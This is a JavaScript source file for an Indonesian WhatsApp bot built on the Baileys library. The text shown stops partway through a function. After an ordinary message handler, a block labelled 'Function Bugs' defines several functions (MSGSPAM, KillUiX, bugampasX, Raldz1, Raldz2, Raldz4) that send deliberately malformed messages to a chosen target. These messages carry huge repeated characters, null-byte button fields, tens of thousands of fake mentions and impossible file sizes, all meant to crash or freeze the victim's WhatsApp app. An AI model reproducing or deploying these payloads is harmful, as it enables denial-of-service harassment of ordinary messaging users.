  /**
  
Base Created By KyuuRzy
Script Created By RaldzzXyz

Mau Rename/Recode? Ingat Kasi Credit KyuuRzy & RaldzzXyz

Support Me With
Subscribe YT : @raldzzoffc
Follow TT : @raldzzxyz_
Follow Instagram : @rxyz_ - RaldzzXyz

Thankyou Guys, Stay Happy And Stay Safe

You Respect? I'm Will Respect !!! 
  
  **/
  
require('../setting/config');

const { promisify } = require('util');
const util = require("util");
const fs = require('fs');
const mimeTypes = require('mime-types');
const axios = require('axios');
const path = require('path');
const chalk = require("chalk");
const crypto = require('crypto');
const fetch = require("node-fetch")
const jimp = require("jimp")
const os = require('os')
const cp = require('child_process');
const ms = require("parse-ms");
const sharp = require('sharp');
const yts = require('yt-search')
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');
const { color } = require('./lib/color');

const {
    default: baileys,
    proto,
    delay,
    jidNormalizedUser,
    generateWAMessage,
    generateWAMessageFromContent,
    getContentType,
    prepareWAMessageMedia,
} = require("@whiskeysockets/baileys");

module.exports = conn = async (conn, m, chatUpdate, mek, store) => {
   try {
         if (global.db.data == null) await loadDatabase();
         require('./lib/database/schema')(m)

const chats = global.db.data.chats[m.chat];
const users = global.db.data.users[m.sender];
const settings = global.db.data.settings;
const { Worker } = require('worker_threads');
      
const body = (
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
    m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const budy = (typeof m.text === 'string' ? m.text : '');
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? 
                        body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" 
                      : global.prefa ?? global.prefix
        
var textmessage = (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || budy) : ""

const content = JSON.stringify(mek.message)
const type = Object.keys(mek.message)[0];
if (m && type == "protocolMessage") conn.ev.emit("message.delete", m.message.protocolMessage.key);
const { sender } = m;
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

//database 
const kontributor = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'));
const _afk = JSON.parse(fs.readFileSync('./start/lib/database/afk.json'));
const pendaftar = JSON.parse(fs.readFileSync('./start/lib/database/pendaftar.json'));
const orang_spam = JSON.parse(fs.readFileSync('./start/lib/database/spaming.json'));
const user_ban = JSON.parse(fs.readFileSync('./start/lib/database/banned.json'))

const botNumber = await conn.decodeJid(conn.user.id);
const isUser = pendaftar.includes(m.sender)
const Access = [botNumber, ...global.owner, ...kontributor]
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender) ? true : m.isChecking ? true :false
  
const Dev = [botNumber, ...global.owner]
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender) ? true : m.isChecking ? true :false

//------ Prefix Function
    const CMD = body.startsWith(prefix)
    const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
//------ End

const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");

const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;

const qmsg = quoted.msg || quoted;
const mime = qmsg.mimetype || '';
const isImage = type === 'imageMessage';
const isVideo = type === 'videoMessage';
const isAudio = type === 'audioMessage';
const isMedia = /image|video|sticker|audio/.test(mime);

const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')

//group
const groupMetadata = isGroup ? await conn.groupMetadata(m.chat).catch(() => {}) : "";
const groupOwner = isGroup && groupMetadata ? groupMetadata.owner : "";
const groupName = isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? participants.filter(v => v.admin !== null).map(v => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

const TypeMess = getContentType(m?.message);
let reactions = TypeMess == "reactionMessage" ? m?.message[TypeMess]?.text : false;
        
const isBan = user_ban.includes(m.sender)
//time
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
    ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};

const peler = fs.readFileSync('./start/lib/media/peler.jpg')
const cina = ["https://webtechsolution.my.id/assets/images/logo-wa.png"]
 
function getRandomImage() {
    const randomIndex = Math.floor(Math.random() * cina.length);
    return cina[randomIndex];
}
const JoshhhConst = getRandomImage()

async function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)]
}
        
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)

//function
const {
    smsg,
    sendGmail,
    formatSize,
    isUrl,
    generateMessageTag, 
    getBuffer,
    getSizeMedia, 
    runtime, 
    fetchJson, 
    sleep,
    getRandom
} = require('./lib/myfunction');
    
const { 
    imageToWebp, 
    videoToWebp,
    writeExifImg,
    writeExifVid,
    addExif
} = require('./lib/exif')

const {
	jadibot,
	stopjadibot,
	listjadibot
} = require('./jadibot')

const { ytdl } = require('./lib/scrape/scrape-ytdl');   
const { spamngl } = require('./lib/scrape/scrape-ngl');
const { pindl } = require('./lib/scrape/scrape-pindl')
const { tiktok } = require('./lib/scrape/scrape-tiktok')
const { igdl } = require('./lib/scrape/scrape-igdl')
const { luminai } = require('./lib/scrape/scrape-luminai')
const { VocalRemover } = require('./lib/scrape/scrape-tovocal')
const { Telesticker } = require('./lib/scrape/scrape-telesticker')
const { pinterest } = require("./lib/scrape/scrape-pinterest");
const { scrapeSoundCloud } = require("./lib/scrape/scrape-soundcloud")
const msgFilter = require("./lib/antispam");
const uploadImage = require('./lib/uploadImage');
        
const afk = require("./lib/afk")
const isAfkOn = afk.checkAfkUser(m.sender, _afk)
/* fungsinya, ketika user yang sudah menggunakan command afk, maka tidak bisa lagi menggunakan command tersebut sampai dia kembali dari afk nya */

const _prem = require("./lib/premium");
const isPremium = Access ? true : _prem.checkPremiumUser(m.sender);
//const gcounti = global.gcount
//const gcount = isPremium ? gcounti.prem : gcounti.user
let limitUser = isPremium ? 1500 : global.limitCount

if (reactions) {
    if (["😂"].includes(reactions)) {
        let crt = fs.readFileSync('./start/lib/media/ngakak.mp3')
        conn.sendPresenceUpdate('recording', m.chat)
        conn.sendMessage(m.chat, { 
            audio: crt, 
            mimetype:'audio/mpeg',
            ptt:true
        }, {quoted: m})
    }
}
        
if (reactions) {
    if (["😳"].includes(reactions)) {
        let crt = fs.readFileSync('./start/lib/media/duit.mp3')
        conn.sendPresenceUpdate('recording', m.chat)
        conn.sendMessage(m.chat, { 
            audio: crt, 
            mimetype:'audio/mpeg',
            ptt:true
        }, {quoted: m})
    }
}
        
const reaction = async (jidss, emoji) => {
    conn.sendMessage(jidss, {
        react: { text: emoji,
                key: m.key 
               } 
            }
        );
    };

if (m.mtype === 'listResponseMessage' || m.mtype === 'buttonsResponseMessage') {
    // Dapatkan ID yang dipilih, baik dari List Message atau Button Message
    const selectedId = m.mtype === 'listResponseMessage' ?
                       m.message.listResponseMessage.singleSelectReply.selectedRowId :
                       m.message.buttonsResponseMessage.selectedButtonId;

    console.log(`[DEBUG HANDLER] Menerima balasan dari tombol/list. ID dipilih: ${selectedId}`); // Debugging log

    // Periksa apakah ID yang dipilih berasal dari perintah 'sendfile' (prefix baru)
    if (selectedId && selectedId.startsWith('sendfile_')) { // <-- Ganti prefix di sini
        const selectedFileName = selectedId.substring('sendfile_'.length); // Ambil nama file dari ID (termasuk ekstensi)

        console.log(`[DEBUG HANDLER] ID berasal dari sendfile. Nama file: ${selectedFileName}`); // Debugging log

        // Logika untuk membaca dan mengirim file yang dipilih

        const dataFolderPath = path.join(__dirname, 'data');
        const localFilePath = path.join(dataFolderPath, selectedFileName);

        console.log(`[DEBUG HANDLER] Mencoba membaca file lokal: ${localFilePath}`); // Debugging log

        // Periksa apakah file benar-benar ada sebelum mencoba membacanya
        if (!fs.existsSync(localFilePath)) {
            console.error(`[DEBUG HANDLER] File tidak ditemukan di jalur: ${localFilePath}`); // Log error
            return reply(`Error: File "${selectedFileName}" tidak ditemukan di folder data.`);
        }

        try {
            // Beri indikasi bot sedang memproses pengiriman file
            await reaction(m.chat, "⚡");

            const fileBuffer = fs.readFileSync(localFilePath);

            console.log(`[DEBUG HANDLER] File berhasil dibaca. Ukuran: ${fileBuffer.length} bytes.`); // Debugging log

            // Tentukan MIME type berdasarkan ekstensi file
            const fileExtension = path.extname(selectedFileName).toLowerCase();
            const mimeType = mimeTypes.lookup(fileExtension) || 'application/octet-stream'; // Default ke octet-stream jika tidak diketahui

            console.log(`[DEBUG HANDLER] Ekstensi file: ${fileExtension}, MIME Type: ${mimeType}`); // Debugging log

            // Kirim file sebagai dokumen
            await conn.sendMessage(m.chat, {
                document: fileBuffer,
                fileName: selectedFileName, // Gunakan nama file yang dipilih
                mimetype: mimeType // Gunakan MIME type yang ditentukan
            }, { quoted: m }); // quoted m di sini mengutip pesan balasan daftar/tombol

            console.log(`[DEBUG HANDLER] Perintah sendMessage untuk dokumen telah dipanggil.`); // Debugging log

        } catch (readFileError) {
            console.error(`[DEBUG HANDLER] Error membaca file lokal "${selectedFileName}":`, readFileError); // Log error
            reply(`Gagal membaca file "${selectedFileName}". Pastikan file masih ada di folder ./data/. Error: ${readFileError.message}`);
        }
    }
    // Tambahkan logika untuk menangani balasan list/button message lainnya jika ada
    // else if (selectedId && selectedId.startsWith('some_other_prefix_')) { ... }
}

// ... Sisa kode handler pesan utama Anda
// ... switch (command) { ... } // Blok switch (command) Anda ada di sini

// ================ Function Bugs =================== \\

async function MSGSPAM(target) {
    let Msg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target, "13135550002@s.whastapp.net"],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "ꦾ".repeat(90000),
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: "\u0000".repeat(911777),
                },
              ],
            },
          },
        },
      },
    };

    await conn.relayMessage(target, Msg, {
      participant: { jid: target },
    })
  }
  
async function KillUiX(target, Ptcp = false) {
    conn.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "💣⃢⃠⃢🦠⃢⃟⃟⃞⃞⃤⃝⃤⃢🌹⃢⃠⃟𝐑𝐚𝐥𝐝𝐳𝐙𝐲𝐲𝕏𝗨𝗜-𝗞𝗶𝗹𝗹" + "ꦾ".repeat(250000)
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "",
                        buttons: [
                            {
                                name: "quick_reply",
                                buttonParamsJson: "{\"display_text\":\"ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ\",\"id\":\".groupchat\"}"
                            },
                            {
                                name: "single_select",
                                buttonParamsJson: {
                                    title: "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ",
                                    sections: [
                                        {
                                            title: "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ💮⃢📵",
                                            rows: []
                                        }
                                    ]
                                }
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "📵" }]
                    }
                }
            }
        }
    }, { participant: { jid: target }, messageId: null });
}
    
async function bugampasX(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u200D".repeat(1000),
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            target, "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "RaldzzXyz",
                                    title: "PHONiX",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/raldzzxyz_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: true
                        }
                    ]
                }
            }
        }
    }, {});

    await conn.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await conn.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}

async function Raldz1(target, Ptcp = true) {
  try {
    await conn.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 999.999999999,
                  degreesLongitude: -999.99999999,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "[🌹] 𝗥̷̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗔̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗟̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗗̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗭̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡" + + "ꦾ".repeat(30000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [target],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "\u0000\u0011",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

async function Raldz2(target, Ptcp = true) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "[🦠] 𝗥̷̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗔̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗟̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗗̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗭̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡\n" + "ꦾ".repeat(27777),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: conn.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "༿༑ᜳ⁑⃟𝗥𝗔༽𝗟𝗗𝗭𝗭͢𑲭͠𝗫꙰༽𝗬𝗭​᭄̬͠͠ᢶ",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "Persetan Dengan Cinta, Hidup Dalam Kegelapan.",
                },
                contentText: '༿༑ᜳ⁑⃟𝗥𝗔༽𝗟𝗗𝗭𝗭͢𑲭͠𝗫꙰༽𝗬𝗭​᭄̬͠͠ᢶ',
                footerText: "",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(55000),
                    buttonText: {
                      displayText: "\u0007",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: { url: 'https://files.catbox.moe/w1isit.jpg' },
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/RaldzzXyz",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '! P',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "©Originial_Bug",
              thumbnail: { url: 'https://files.catbox.moe/w1isit.jpg' },
              sourceUrl: "Tetaplah Menjadi Bodoh...",
              sourceId: "x - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `${"أ".repeat(100)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "X",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await conn.relayMessage(target, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: target },
  });
}
				
async function Raldz4(target, ptcp = true) {
  const jids = `ꦾ`.repeat(90050);
  
  await conn.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "༿༑ᜳ⁑⃟𝗥𝗔༽𝗟𝗗𝗭𝗭͢𑲭͠𝗫꙰༽𝗬𝗭​᭄̬͠͠ᢶ",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: '[📵] 𝗥̷̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗔̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗟̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗗̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗭̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡\n' + jids,
            },
            footer: {
              text: '',
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "༿༑ᜳ⁑⃟𝗥𝗔༽𝗟𝗗𝗭𝗭͢𑲭͠𝗫꙰༽𝗬𝗭​᭄̬͠͠ᢶ",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
